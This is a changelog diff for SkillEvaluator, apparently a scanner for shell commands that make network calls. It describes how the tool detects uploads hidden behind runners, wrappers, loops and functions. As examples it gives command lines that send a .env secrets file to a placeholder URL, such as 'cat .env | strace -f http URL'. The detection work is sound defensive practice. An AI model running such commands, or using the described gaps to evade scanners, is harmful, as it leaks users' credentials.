@@ -537,21 +537,28 @@ All notable changes to SkillEvaluator are documented in this file.
   or `find . -exec curl URL \;`, is now scored like a direct `curl URL`. A
   mention followed by an HTTP method, an upload flag, or a `key=value` word,
   such as `http POST` in prose, still warns.
-  A fixed set of runners that start a command in another host, container,
-  root, user, or network namespace, such as `ssh`, `docker`, `docker-compose`,
+  A fixed set of runners that start a command in another host, container, root,
+  user, or network namespace, such as `ssh`, `docker`, `docker-compose`,
   `kubectl`, `apptainer`, `chroot`, `systemd-nspawn`, `bwrap`, or
   `ip netns exec`, warns on any client named after it, even one named only as
   data, as in `docker exec app apt-get install -y curl`. That holds when the
-  runner is the command itself or follows a pass-through wrapper such as
-  `strace`, `ionice`, `flock`, or `watch`. A runner reached through another
-  command, as in `find . -exec ssh host curl URL \;` or
+  runner is the command itself, including after a compound keyword, function
+  header, `case` pattern, or `coproc`
+  (`while true; do ssh host curl URL; done`), when it follows a pass-through
+  wrapper such as `strace`, `ionice`, `flock`, or `watch`, and when a function
+  that wraps it is called. A runner reached through another command, as in
+  `find . -exec ssh host curl URL \;` or
   `git submodule foreach ssh host curl URL`, and a runner outside the set are
   checked only with the client's upload rules.
   Piped or redirected input stays with a text consumer such as `grep`, `awk`,
   `sed`, or `jq`; any other command, loop, `if`, `{ ...; }` group, or function
   body may pass it on, so `cat .env | strace -f http URL`, `< .env http URL`,
-  `sudo < .env http URL`, `2>&1 < .env http URL`, and
-  `while read -r l; do http URL; done < .env` still warn. A substitution any of
+  `sudo < .env http URL`, `2>&1 < .env http URL`,
+  `case "$1" in *) < .env http URL;; esac`, and
+  `while read -r l; do http URL; done < .env` still warn. A function that wraps
+  a client, as in `up() { curl "$@"; }; up -d @.env URL`, is checked with that
+  client's rules, and a `$VAR` command word with no known value that is given a
+  URL gets the curl and wget upload rules. A substitution any of
   whose commands names a client or runner, such as `$(which curl)`,
   `$(env which curl)`, `$(cd /tmp && which curl)`,
   `$(command -v curl 2>/dev/null)`, `$(readlink -f $(which curl))`, or
